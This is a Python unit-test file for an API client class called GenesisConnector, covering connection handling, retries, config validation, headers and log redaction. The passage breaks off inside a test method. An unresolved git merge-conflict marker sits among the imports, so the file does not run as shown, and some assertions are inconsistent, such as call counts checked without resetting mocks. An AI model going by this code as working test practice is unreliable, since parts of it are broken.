import pytest
import unittest
from unittest.mock import Mock, patch, MagicMock, call
<<<<<<< HEAD
import asyncio
import json
from datetime import datetime, timedelta
import logging
from typing import Dict, List, Optional, Any

# Import the module under test
try:
    from app.ai_backend.genesis_connector import GenesisConnector
except ImportError:
    from ai_backend.genesis_connector import GenesisConnector


class TestGenesisConnector(unittest.TestCase):
    """
    Comprehensive unit tests for GenesisConnector class.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):

        """
        Prepares a new GenesisConnector instance and mock configuration for each test case.
        """
        self.connector = GenesisConnector()
        self.mock_config = {
            'api_key': 'test_api_key',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'retry_count': 3
        }
        
    def tearDown(self):

        """
        Performs cleanup after each test method. Override this method to reset state or release resources as needed.
        """
        # Reset any global state if needed
        pass

    def test_init_default_parameters(self):

        """
        Test that a GenesisConnector instance can be created with default parameters and is properly initialized.
        """
        connector = GenesisConnector()
        self.assertIsNotNone(connector)
        self.assertIsInstance(connector, GenesisConnector)

    def test_init_with_config(self):

        """
        Test that GenesisConnector initializes correctly with a custom configuration.
        
        Verifies that the connector instance is created and its configuration matches the provided mock configuration.
        """
        connector = GenesisConnector(config=self.mock_config)
        self.assertIsNotNone(connector)
        self.assertEqual(connector.config, self.mock_config)

    def test_init_with_none_config(self):

        """
        Test that initializing GenesisConnector with None as the configuration does not raise an exception and returns a valid instance.
        """
        connector = GenesisConnector(config=None)
        self.assertIsNotNone(connector)

    def test_init_with_empty_config(self):
        """
        Test that GenesisConnector initializes successfully when provided with an empty configuration dictionary.
        """
        connector = GenesisConnector(config={})
        self.assertIsNotNone(connector)

    def test_init_with_invalid_config_type(self):
        """
        Test that initializing GenesisConnector with a non-dictionary config raises a TypeError.
        """
        with self.assertRaises(TypeError):
            GenesisConnector(config="invalid_string_config")

    def test_init_with_config_containing_non_string_keys(self):
        """
        Test that initializing GenesisConnector with a config containing non-string keys raises a ValueError.
        """
        invalid_config = {123: 'value', 'valid_key': 'value'}
        with self.assertRaises(ValueError):
            GenesisConnector(config=invalid_config)

    @patch('requests.get')
    def test_connect_success(self, mock_get):

        """
        Test that `connect()` returns True when the Genesis API responds with HTTP 200 and valid JSON.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_response
        
        result = self.connector.connect()
        
        self.assertTrue(result)
        mock_get.assert_called_once()

    @patch('requests.get')
    def test_connect_failure_404(self, mock_get):

        """
        Test that the connect() method returns False when the server responds with HTTP 404 Not Found.
        """
        mock_response = Mock()
        mock_response.status_code = 404
        mock_get.return_value = mock_response
        
        result = self.connector.connect()
        
        self.assertFalse(result)

    @patch('requests.get')
    def test_connect_failure_timeout(self, mock_get):
        """
        Test that the connector returns False when a connection attempt fails due to a timeout.
        """
        mock_get.side_effect = TimeoutError("Connection timeout")
        
        result = self.connector.connect()
        
        self.assertFalse(result)

    @patch('requests.get')
    def test_connect_failure_connection_error(self, mock_get):

        """
        Test that connect() returns False when a connection error occurs during the connection attempt.
        """
        mock_get.side_effect = ConnectionError("Connection failed")
        
        result = self.connector.connect()
        
        self.assertFalse(result)

    @patch('requests.get')
    def test_connect_with_ssl_verification_disabled(self, mock_get):
        """
        Test that the connector successfully establishes a connection when SSL verification is disabled in the configuration.
        
        Verifies that the HTTP request is made with SSL verification turned off.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_response
        
        connector = GenesisConnector(config={'verify_ssl': False})
        result = connector.connect()
        
        self.assertTrue(result)
        # Verify SSL verification was disabled
        mock_get.assert_called_with(verify=False, allow_redirects=True)

    @patch('requests.get')
    def test_connect_with_custom_user_agent(self, mock_get):
        """
        Verifies that the connector sends a connection request with a custom User-Agent header when specified in the configuration.
        
        Ensures that the custom User-Agent value is present in the HTTP request headers during connection.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_response
        
        custom_config = {
            'user_agent': 'GenesisConnector/1.0 (Custom Agent)',
            'base_url': 'https://api.test.com'
        }
        connector = GenesisConnector(config=custom_config)
        result = connector.connect()
        
        self.assertTrue(result)
        # Check that custom User-Agent was used
        call_args = mock_get.call_args
        self.assertIn('User-Agent', call_args[1]['headers'])

    @patch('requests.get')
    def test_connect_with_proxy_configuration(self, mock_get):
        """
        Verifies that the GenesisConnector uses the specified proxy configuration when establishing a connection.
        
        Ensures that the proxy settings are correctly passed to the underlying HTTP request and that a successful connection returns True.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_response
        
        proxy_config = {
            'base_url': 'https://api.test.com',
            'proxies': {'http': 'http://proxy.test.com:8080'}
        }
        connector = GenesisConnector(config=proxy_config)
        result = connector.connect()
        
        self.assertTrue(result)
        # Verify proxy was used
        call_args = mock_get.call_args
        self.assertIn('proxies', call_args[1])

    @patch('requests.get')
    def test_connect_with_authentication_headers(self, mock_get):
        """
        Verifies that the connector includes the correct authentication headers when establishing a connection with authentication configured.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_response
        
        auth_config = {
            'api_key': 'test_key',
            'base_url': 'https://api.test.com',
            'auth_type': 'bearer'
        }
        connector = GenesisConnector(config=auth_config)
        result = connector.connect()
        
        self.assertTrue(result)
        # Check authentication header
        call_args = mock_get.call_args
        headers = call_args[1]['headers']
        self.assertIn('Authorization', headers)

    @patch('requests.get')
    def test_connect_with_multiple_failure_codes(self, mock_get):
        """
        Test that the connector's connect() method returns False for a range of HTTP failure status codes.
        
        Verifies that connection attempts fail gracefully for common client and server error codes.
        """
        failure_codes = [400, 401, 403, 404, 500, 502, 503, 504]
        
        for code in failure_codes:
            with self.subTest(status_code=code):
                mock_response = Mock()
                mock_response.status_code = code
                mock_get.return_value = mock_response
                
                result = self.connector.connect()
                self.assertFalse(result)

    @patch('requests.get')
    def test_connect_with_redirect_handling(self, mock_get):
        """
        Test that the connector successfully establishes a connection when HTTP redirects occur and verifies that redirects are properly followed.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_response.history = [Mock(status_code=301)]
        mock_get.return_value = mock_response
        
        result = self.connector.connect()
        
        self.assertTrue(result)
        # Verify redirects were followed
        mock_get.assert_called_with(allow_redirects=True)

    @patch('requests.post')
    def test_send_request_success(self, mock_post):

        """
        Verify that send_request returns the correct response dictionary when a POST request with a valid payload succeeds.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'data': 'test_response'}
        mock_post.return_value = mock_response
        
        payload = {'message': 'test_message'}
        result = self.connector.send_request(payload)
        
        self.assertEqual(result, {'data': 'test_response'})
        mock_post.assert_called_once()

    @patch('requests.post')
    def test_send_request_invalid_payload(self, mock_post):

        """
        Test that sending a request with a None payload raises a ValueError.
        """
        with self.assertRaises(ValueError):
            self.connector.send_request(None)

    @patch('requests.post')
    def test_send_request_empty_payload(self, mock_post):
        """
        Test that sending a request with an empty payload raises a ValueError.
        """
        with self.assertRaises(ValueError):
            self.connector.send_request({})

    @patch('requests.post')
    def test_send_request_server_error(self, mock_post):

        """
        Test that send_request raises a RuntimeError when the server returns a 500 Internal Server Error response.
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_response.text = 'Internal Server Error'
        mock_post.return_value = mock_response
        
        payload = {'message': 'test_message'}
        
        with self.assertRaises(RuntimeError):
            self.connector.send_request(payload)

    @patch('requests.post')
    def test_send_request_malformed_json(self, mock_post):

        """
        Tests that send_request raises a ValueError when the server responds with malformed JSON.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", "", 0)
        mock_post.return_value = mock_response
        
        payload = {'message': 'test_message'}
        
        with self.assertRaises(ValueError):
            self.connector.send_request(payload)

    @patch('requests.post')
    def test_send_request_with_different_http_methods(self, mock_post):
        """
        Verifies that the connector can send requests using various HTTP methods and correctly processes the responses.
        
        Each supported HTTP method (GET, POST, PUT, DELETE, PATCH) is tested to ensure the request is sent and the response is handled as expected.
        """
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
        
        for method in methods:
            with self.subTest(method=method):
                with patch(f'requests.{method.lower()}') as mock_request:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = {'method': method}
                    mock_request.return_value = mock_response
                    
                    payload = {'message': 'test', 'method': method}
                    result = self.connector.send_request(payload, method=method)
                    
                    self.assertEqual(result['method'], method)

    @patch('requests.post')
    def test_send_request_with_file_upload(self, mock_post):
        """
        Verifies that the connector can successfully send a request with a file upload and that the file is included in the request payload.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'uploaded': True}
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        files = {'file': ('test.txt', 'file content', 'text/plain')}
        result = self.connector.send_request(payload, files=files)
        
        self.assertEqual(result['uploaded'], True)
        # Verify files were included in the request
        call_args = mock_post.call_args
        self.assertIn('files', call_args[1])

    @patch('requests.post')
    def test_send_request_with_streaming_response(self, mock_post):
        """
        Test that sending a request with streaming enabled returns a non-None response when the server responds with streamed content.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.iter_content.return_value = [b'chunk1', b'chunk2']
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        result = self.connector.send_request(payload, stream=True)
        
        self.assertIsNotNone(result)

    @patch('requests.post')
    def test_send_request_with_custom_timeout(self, mock_post):
        """
        Test that sending a request with a custom timeout value correctly applies the timeout and returns the expected response.
        
        Verifies that the timeout parameter is passed to the underlying HTTP request and that the response is handled as expected.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'timeout_test': True}
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        result = self.connector.send_request(payload, timeout=60)
        
        self.assertEqual(result['timeout_test'], True)
        # Verify timeout was set
        call_args = mock_post.call_args
        self.assertEqual(call_args[1]['timeout'], 60)

    @patch('requests.post')
    def test_send_request_with_request_id_tracking(self, mock_post):
        """
        Verify that sending a request with a request ID in the payload returns a response containing the same request ID.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'request_id': '12345'}
        mock_post.return_value = mock_response
        
        payload = {'message': 'test', 'request_id': '12345'}
        result = self.connector.send_request(payload)
        
        self.assertEqual(result['request_id'], '12345')

    def test_validate_config_valid(self):

        """
        Test that `validate_config` returns True when provided with a valid configuration dictionary.
        """
        valid_config = {
            'api_key': 'valid_key',
            'base_url': 'https://valid.url',
            'timeout': 30
        }
        
        result = self.connector.validate_config(valid_config)
        
        self.assertTrue(result)

    def test_validate_config_missing_api_key(self):

        """
        Test that `validate_config` raises a `ValueError` when the API key is missing from the configuration.
        """
        invalid_config = {
            'base_url': 'https://valid.url',
            'timeout': 30
        }
        
        with self.assertRaises(ValueError):
            self.connector.validate_config(invalid_config)

    def test_validate_config_invalid_url(self):

        """
        Test that `validate_config` raises a `ValueError` when provided with a configuration containing an invalid base URL.
        """
        invalid_config = {
            'api_key': 'valid_key',
            'base_url': 'invalid_url',
            'timeout': 30
        }
        
        with self.assertRaises(ValueError):
            self.connector.validate_config(invalid_config)

    def test_validate_config_negative_timeout(self):

        """
        Test that `validate_config` raises a `ValueError` when given a configuration with a negative timeout value.
        """
        invalid_config = {
            'api_key': 'valid_key',
            'base_url': 'https://valid.url',
            'timeout': -1
        }
        
        with self.assertRaises(ValueError):
            self.connector.validate_config(invalid_config)

    def test_validate_config_none_input(self):
        """
        Test that validating a configuration with None input raises a ValueError.
        """
        with self.assertRaises(ValueError):
            self.connector.validate_config(None)

    def test_validate_config_with_extreme_values(self):
        """
        Tests that the configuration validator correctly accepts configs with minimum and large values, and rejects configs with empty API keys or invalid URL schemes.
        """
        extreme_configs = [
            {'api_key': 'k', 'base_url': 'https://a.b', 'timeout': 0.1},  # Minimum values
            {'api_key': 'x' * 1000, 'base_url': 'https://very-long-domain-name.com', 'timeout': 3600},  # Large values
            {'api_key': '', 'base_url': 'https://test.com', 'timeout': 30},  # Empty API key
            {'api_key': 'test', 'base_url': 'ftp://invalid.scheme', 'timeout': 30},  # Invalid scheme
        ]
        
        for i, config in enumerate(extreme_configs):
            with self.subTest(config_index=i):
                if i < 2:  # First two should pass
                    result = self.connector.validate_config(config)
                    self.assertTrue(result)
                else:  # Last two should fail
                    with self.assertRaises(ValueError):
                        self.connector.validate_config(config)

    def test_validate_config_with_additional_fields(self):
        """
        Verify that the configuration validator accepts configs containing additional optional fields beyond the required ones.
        """
        extended_config = {
            'api_key': 'test_key',
            'base_url': 'https://api.test.com',
            'timeout': 30,
            'retry_count': 5,
            'retry_delay': 2,
            'user_agent': 'CustomAgent/1.0',
            'max_connections': 10,
            'verify_ssl': True,
            'proxies': {'http': 'http://proxy.test.com:8080'}
        }
        
        result = self.connector.validate_config(extended_config)
        self.assertTrue(result)

    @patch('requests.get')
    def test_get_status_healthy(self, mock_get):

        """
        Verify that `get_status` returns a status dictionary with 'healthy' and correct version when the service responds with HTTP 200 and a healthy payload.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'healthy', 'version': '1.0.0'}
        mock_get.return_value = mock_response
        
        status = self.connector.get_status()
        
        self.assertEqual(status['status'], 'healthy')
        self.assertEqual(status['version'], '1.0.0')

    @patch('requests.get')
    def test_get_status_unhealthy(self, mock_get):
        """
        Test that get_status() returns 'unhealthy' when the service responds with HTTP 503.
        """
        mock_response = Mock()
        mock_response.status_code = 503
        mock_get.return_value = mock_response
        
        status = self.connector.get_status()
        
        self.assertEqual(status['status'], 'unhealthy')

    @patch('requests.get')
    def test_get_status_with_detailed_response(self, mock_get):
        """
        Test that get_status() returns a detailed status dictionary with health, version, uptime, connection count, and other metadata when the backend responds with extended status information.
        """
        detailed_status = {
            'status': 'healthy',
            'version': '2.1.0',
            'uptime': 86400,
            'connections': 42,
            'memory_usage': '256MB',
            'last_restart': '2024-01-15T10:30:00Z'
        }
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = detailed_status
        mock_get.return_value = mock_response
        
        status = self.connector.get_status()
        
        self.assertEqual(status['status'], 'healthy')
        self.assertEqual(status['version'], '2.1.0')
        self.assertEqual(status['uptime'], 86400)
        self.assertEqual(status['connections'], 42)

    @patch('requests.get')
    def test_get_status_with_partial_service_degradation(self, mock_get):
        """
        Test that get_status() returns a degraded status with relevant issue details when the service is partially degraded.
        
        Verifies that the returned status includes 'issues' and 'affected_endpoints' fields when the backend reports partial degradation.
        """
        degraded_status = {
            'status': 'degraded',
            'issues': ['high_latency', 'connection_pool_exhausted'],
            'affected_endpoints': ['/api/v1/heavy-operation']
        }
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = degraded_status
        mock_get.return_value = mock_response
        
        status = self.connector.get_status()
        
        self.assertEqual(status['status'], 'degraded')
        self.assertIn('issues', status)
        self.assertIn('affected_endpoints', status)

    def test_format_payload_valid_data(self):
        """
        Tests that the payload formatting method correctly serializes valid data containing strings, timestamps, and nested dictionaries.
        """
        data = {
            'message': 'test',
            'timestamp': datetime.now().isoformat(),
            'metadata': {'key': 'value'}
        }
        
        formatted = self.connector.format_payload(data)
        
        self.assertIn('message', formatted)
        self.assertIn('timestamp', formatted)
        self.assertIn('metadata', formatted)

    def test_format_payload_with_special_characters(self):

        """
        Verify that the payload formatting method correctly processes data containing special characters and Unicode, ensuring all specified keys are present in the formatted output.
        """
        data = {
            'message': 'test with üñíçødé',
            'special': '!@#$%^&*()',
            'quotes': 'text with "quotes" and \'apostrophes\''
        }
        
        formatted = self.connector.format_payload(data)
        
        self.assertIn('message', formatted)
        self.assertIn('special', formatted)
        self.assertIn('quotes', formatted)

    def test_format_payload_empty_data(self):

        """
        Test that `format_payload` raises a ValueError when called with an empty dictionary.
        """
        with self.assertRaises(ValueError):
            self.connector.format_payload({})

    def test_format_payload_none_data(self):
        """
        Test that formatting a payload with None data raises a ValueError.
        """
        with self.assertRaises(ValueError):
            self.connector.format_payload(None)

    def test_format_payload_with_nested_structures(self):
        """
        Tests that the payload formatter correctly serializes deeply nested data structures without errors.
        
        Ensures that all nested keys and values are present in the formatted output.
        """
        nested_data = {
            'level1': {
                'level2': {
                    'level3': {
                        'level4': {
                            'deep_value': 'found',
                            'array': [1, 2, {'nested_in_array': True}]
                        }
                    }
                }
            },
            'timestamp': datetime.now().isoformat()
        }
        
        formatted = self.connector.format_payload(nested_data)
        
        self.assertIn('level1', formatted)
        self.assertIn('timestamp', formatted)

    def test_format_payload_with_circular_references(self):
        """
        Test that formatting a payload containing circular references raises a ValueError.
        """
        data = {'key': 'value'}
        data['self'] = data  # Create circular reference
        
        # Should handle circular references gracefully
        with self.assertRaises(ValueError):
            self.connector.format_payload(data)

    def test_format_payload_with_binary_data(self):
        """
        Test that the payload formatter correctly processes and serializes binary data fields.
        
        Verifies that binary fields in the payload are handled appropriately (e.g., encoded or converted) and that non-binary fields remain accessible in the formatted output.
        """
        binary_data = {
            'message': 'test',
            'binary_field': b'binary_content',
            'image_data': b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR'
        }
        
        formatted = self.connector.format_payload(binary_data)
        
        self.assertIn('message', formatted)
        # Binary data should be handled appropriately (encoded/converted)

    def test_format_payload_with_datetime_objects(self):
        """
        Test that the payload formatter correctly serializes datetime, date, and time objects.
        
        Ensures that fields containing datetime-related objects are present in the formatted payload and are properly handled by the serialization logic.
        """
        from datetime import datetime, date, time
        
        datetime_data = {
            'datetime_field': datetime.now(),
            'date_field': date.today(),
            'time_field': time(14, 30, 0),
            'timestamp': datetime.now().timestamp()
        }
        
        formatted = self.connector.format_payload(datetime_data)
        
        # All datetime objects should be properly serialized
        self.assertIn('datetime_field', formatted)
        self.assertIn('date_field', formatted)
        self.assertIn('time_field', formatted)

    @patch('requests.post')
    def test_retry_mechanism_success_after_retry(self, mock_post):

        """
        Tests that `send_request_with_retry` retries after an initial failure and returns the expected response on a subsequent successful attempt.
        
        Simulates a failed POST request followed by a successful one, verifying that the method returns the correct data and performs the expected number of retries.
        """
        # First call fails, second succeeds
        mock_response_fail = Mock()
        mock_response_fail.status_code = 500
        mock_response_success = Mock()
        mock_response_success.status_code = 200
        mock_response_success.json.return_value = {'data': 'success'}
        
        mock_post.side_effect = [mock_response_fail, mock_response_success]
        
        payload = {'message': 'test'}
        result = self.connector.send_request_with_retry(payload)
        
        self.assertEqual(result, {'data': 'success'})
        self.assertEqual(mock_post.call_count, 2)

    @patch('requests.post')
    def test_retry_mechanism_max_retries_exceeded(self, mock_post):

        """
        Test that a RuntimeError is raised when all retry attempts for a failed request are exhausted.
        
        Ensures the request is retried the correct number of times and each attempt results in a server error.
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        
        with self.assertRaises(RuntimeError):
            self.connector.send_request_with_retry(payload, max_retries=3)
        
        self.assertEqual(mock_post.call_count, 4)  # Initial + 3 retries

    @patch('time.sleep')
    @patch('requests.post')
    def test_retry_mechanism_backoff_timing(self, mock_post, mock_sleep):

        """
        Verifies that the retry mechanism uses incrementally increasing backoff delays between retries after consecutive server errors.
        
        Simulates repeated server errors and asserts that the sleep function is called with increasing delay values as specified by the backoff strategy.
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        
        with self.assertRaises(RuntimeError):
            self.connector.send_request_with_retry(payload, max_retries=2)
        
        # Check that sleep was called with increasing delays
        expected_calls = [call(1), call(2)]
        mock_sleep.assert_has_calls(expected_calls)

    @patch('time.sleep')
    @patch('requests.post')
    def test_retry_mechanism_with_exponential_backoff(self, mock_post, mock_sleep):
        """
        Test that the retry mechanism applies exponential backoff delays and raises RuntimeError after exceeding maximum retries.
        
        Simulates repeated server errors and verifies that sleep intervals follow an exponential pattern (1, 2, 4, 8 seconds).
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        
        with self.assertRaises(RuntimeError):
            self.connector.send_request_with_retry(payload, max_retries=4, backoff_strategy='exponential')
        
        # Check exponential backoff timing: 1, 2, 4, 8
        expected_calls = [call(1), call(2), call(4), call(8)]
        mock_sleep.assert_has_calls(expected_calls)

    @patch('time.sleep')
    @patch('requests.post')
    def test_retry_mechanism_with_jitter(self, mock_post, mock_sleep):
        """
        Test that the retry mechanism applies jitter to backoff delays and raises RuntimeError after exceeding max retries.
        
        Verifies that random jitter is used to vary sleep intervals between retries, and that the retry logic triggers the appropriate exception on repeated failures.
        """
        with patch('random.uniform') as mock_random:
            mock_random.return_value = 0.5  # Fixed jitter value
            mock_response = Mock()
            mock_response.status_code = 500
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            
            with self.assertRaises(RuntimeError):
                self.connector.send_request_with_retry(payload, max_retries=2, use_jitter=True)
            
            # Sleep should be called with jitter applied
            mock_sleep.assert_called()
            mock_random.assert_called()

    @patch('requests.post')
    def test_retry_mechanism_with_specific_retry_codes(self, mock_post):
        """
        Verify that the retry mechanism in `send_request_with_retry` only retries on specific HTTP status codes (500, 502, 503, 504) and does not retry on others (400, 401, 403, 404, 422).
        
        The test asserts that retries occur for designated retry codes and not for non-retry codes, raising `RuntimeError` after exceeding the maximum retries.
        """
        retry_codes = [500, 502, 503, 504]
        no_retry_codes = [400, 401, 403, 404, 422]
        
        for code in retry_codes:
            with self.subTest(retry_code=code):
                mock_response = Mock()
                mock_response.status_code = code
                mock_post.return_value = mock_response
                
                payload = {'message': 'test'}
                
                with self.assertRaises(RuntimeError):
                    self.connector.send_request_with_retry(payload, max_retries=2)
                
                # Should have retried
                self.assertGreater(mock_post.call_count, 1)
        
        for code in no_retry_codes:
            with self.subTest(no_retry_code=code):
                mock_response = Mock()
                mock_response.status_code = code
                mock_post.return_value = mock_response
                
                payload = {'message': 'test'}
                
                with self.assertRaises(RuntimeError):
                    self.connector.send_request_with_retry(payload, max_retries=2)
                
                # Should NOT have retried
                self.assertEqual(mock_post.call_count, 1)

    def test_parse_response_valid_json(self):
        """
        Test that a valid JSON string is correctly parsed into a Python dictionary.
        """
        response_data = {'key': 'value', 'number': 123, 'bool': True}
        json_string = json.dumps(response_data)
        
        parsed = self.connector.parse_response(json_string)
        
        self.assertEqual(parsed, response_data)

    def test_parse_response_invalid_json(self):

        """
        Test that `parse_response` raises a ValueError when provided with an invalid JSON string.
        """
        invalid_json = '{"invalid": json}'
        
        with self.assertRaises(ValueError):
            self.connector.parse_response(invalid_json)

    def test_parse_response_empty_string(self):
        """
        Test that parsing an empty string response raises a ValueError.
        """
        with self.assertRaises(ValueError):
            self.connector.parse_response('')

    def test_parse_response_none_input(self):

        """
        Test that `parse_response` raises a ValueError when given None as input.
        """
        with self.assertRaises(ValueError):
            self.connector.parse_response(None)

    def test_parse_response_with_different_content_types(self):
        """
        Verifies that the response parser correctly handles various content types, returning parsed JSON for 'application/json' and raw text for other types.
        """
        test_cases = [
            ('application/json', '{"key": "value"}'),
            ('text/plain', 'plain text response'),
            ('application/xml', '<root><key>value</key></root>'),
            ('text/html', '<html><body>response</body></html>')
        ]
        
        for content_type, content in test_cases:
            with self.subTest(content_type=content_type):
                mock_response = Mock()
                mock_response.headers = {'Content-Type': content_type}
                mock_response.text = content
                
                if content_type == 'application/json':
                    mock_response.json.return_value = {"key": "value"}
                    parsed = self.connector.parse_response(mock_response)
                    self.assertEqual(parsed, {"key": "value"})
                else:
                    parsed = self.connector.parse_response(mock_response)
                    self.assertEqual(parsed, content)

    def test_parse_response_with_encoding_issues(self):
        """
        Test that the response parser correctly handles responses with various character encodings, ensuring special characters are processed without errors.
        """
        test_encodings = ['utf-8', 'latin-1', 'ascii']
        
        for encoding in test_encodings:
            with self.subTest(encoding=encoding):
                mock_response = Mock()
                mock_response.encoding = encoding
                mock_response.text = 'test with special chars: café'
                
                parsed = self.connector.parse_response(mock_response)
                self.assertIsNotNone(parsed)

    def test_log_request_valid_data(self):

        """
        Test that log_request logs the payload when given valid data.
        """
        with patch('logging.info') as mock_log:
            payload = {'message': 'test'}
            self.connector.log_request(payload)
            
            mock_log.assert_called()

    def test_log_request_sensitive_data_redaction(self):

        """
        Test that sensitive fields like 'api_key' and 'password' are properly redacted from log output when logging a request payload.
        """
        with patch('logging.info') as mock_log:
            payload = {
                'message': 'test',
                'api_key': 'sensitive_key',
                'password': 'secret_password'
            }
            self.connector.log_request(payload)
            
            # Check that sensitive data was redacted
            logged_message = mock_log.call_args[0][0]
            self.assertNotIn('sensitive_key', logged_message)
            self.assertNotIn('secret_password', logged_message)

    def test_log_request_with_performance_metrics(self):
        """
        Test that logging a request includes performance metrics such as duration when timing is enabled.
        
        Verifies that the log output contains timing information when a request is logged with performance metrics.
        """
        with patch('logging.info') as mock_log, \
             patch('time.time') as mock_time:
            
            mock_time.side_effect = [1000.0, 1000.5]  # 0.5 second duration
            
            payload = {'message': 'test'}
            self.connector.log_request(payload, include_timing=True)
            
            # Check that timing information was logged
            mock_log.assert_called()
            logged_message = mock_log.call_args[0][0]
            self.assertIn('duration', logged_message.lower())

    def test_log_request_with_structured_logging(self):
        """
        Test that the log_request method logs payloads using a structured logging format when requested.
        
        Verifies that structured fields such as 'user_id' and 'session_id' are present in the logged output.
        """
        with patch('logging.info') as mock_log:
            payload = {
                'message': 'test',
                'user_id': 'user123',
                'session_id': 'session456'
            }
            
            self.connector.log_request(payload, structured=True)
            
            # Check that structured format was used
            mock_log.assert_called()
            logged_data = mock_log.call_args[0][0]
            self.assertIn('user_id', logged_data)
            self.assertIn('session_id', logged_data)

    def test_get_headers_with_auth(self):

        """
        Test that `get_headers` includes both `Authorization` and `Content-Type` headers when an API key is provided in the configuration.
        """
        connector = GenesisConnector(config={'api_key': 'test_key'})
        headers = connector.get_headers()
        
        self.assertIn('Authorization', headers)
        self.assertIn('Content-Type', headers)

    def test_get_headers_without_auth(self):

        """
        Verify that `get_headers` excludes the `Authorization` header when authentication is not configured, while ensuring the `Content-Type` header is present.
        """
        connector = GenesisConnector(config={})
        headers = connector.get_headers()
        
        self.assertNotIn('Authorization', headers)
        self.assertIn('Content-Type', headers)

    def test_get_headers_with_custom_headers(self):
        """
        Verify that custom headers provided in the configuration are correctly merged with default headers when retrieving headers from the connector.
        """
        connector = GenesisConnector(config={
            'api_key': 'test_key',
            'custom_headers': {
                'X-Custom-Header': 'custom_value',
                'X-Client-Version': '1.0.0'
            }
        })
        
        headers = connector.get_headers()
        
        self.assertIn('Authorization', headers)
        self.assertIn('X-Custom-Header', headers)
        self.assertIn('X-Client-Version', headers)
        self.assertEqual(headers['X-Custom-Header'], 'custom_value')

    def test_get_headers_with_conditional_headers(self):
        """
        Tests that the `get_headers` method returns the correct `Content-Type` header for different request types, including JSON, form, and multipart requests.
        """
        connector = GenesisConnector(config={'api_key': 'test_key'})
        
        # Test headers for different request types
        json_headers = connector.get_headers(request_type='json')
        self.assertEqual(json_headers['Content-Type'], 'application/json')
        
        form_headers = connector.get_headers(request_type='form')
        self.assertEqual(form_headers['Content-Type'], 'application/x-www-form-urlencoded')
        
        multipart_headers = connector.get_headers(request_type='multipart')
        self.assertIn('multipart/form-data', multipart_headers['Content-Type'])

    def test_close_connection(self):

        """
        Tests that the connector's `close` method can be called without raising any exceptions.
        """
        # This test depends on the actual implementation
        result = self.connector.close()
        
        # Should not raise an exception
        self.assertTrue(True)

    def test_context_manager_usage(self):
        """
        Test that GenesisConnector supports context manager usage and initializes correctly within a with-statement.
        """
        with GenesisConnector(config=self.mock_config) as connector:
            self.assertIsNotNone(connector)
            # Context manager should work without errors

    def test_thread_safety(self):

        """
        Tests that configuration validation in GenesisConnector is thread-safe by performing concurrent validations across multiple threads and verifying all succeed.
        """
        import threading
        results = []
        
        def worker():

            """
            Validates the connector configuration in a separate thread and appends the validation result to a shared results list.
            """
            connector = GenesisConnector(config=self.mock_config)
            results.append(connector.validate_config(self.mock_config))
        
        threads = [threading.Thread(target=worker) for _ in range(5)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        
        # All workers should complete successfully
        self.assertEqual(len(results), 5)
        self.assertTrue(all(results))

    def test_large_payload_handling(self):

        """
        Test that the connector can format and process large payloads without encountering memory errors.
        
        Verifies that formatting a payload containing a large string and a large list completes successfully and returns a non-None result.
        """
        large_payload = {
            'message': 'x' * 10000,  # 10KB string
            'data': list(range(1000))  # Large list
        }
        
        # Should format without raising memory errors
        formatted = self.connector.format_payload(large_payload)
        self.assertIsNotNone(formatted)

    def test_concurrent_requests(self):

        """
        Tests that the connector can process multiple requests concurrently, ensuring each request completes successfully and returns the expected result.
        """
        import concurrent.futures
        
        def make_request():
            """
            Send a test POST request using the connector with a mocked HTTP response.
            
            Returns:
                dict: The parsed response data from the mocked request.
            """
            with patch('requests.post') as mock_post:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {'data': 'test'}
                mock_post.return_value = mock_response
                
                return self.connector.send_request({'message': 'test'})
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(make_request) for _ in range(5)]
            results = [future.result() for future in futures]
        
        # All requests should complete successfully
        self.assertEqual(len(results), 5)

    def test_error_handling_chain(self):

        """
        Verify that exceptions raised during a chained `send_request` call due to network errors are properly propagated.
        """
        with patch('requests.post') as mock_post:
            mock_post.side_effect = Exception("Network error")
            
            payload = {'message': 'test'}
            
            with self.assertRaises(Exception):
                self.connector.send_request(payload)

    def test_configuration_reload(self):
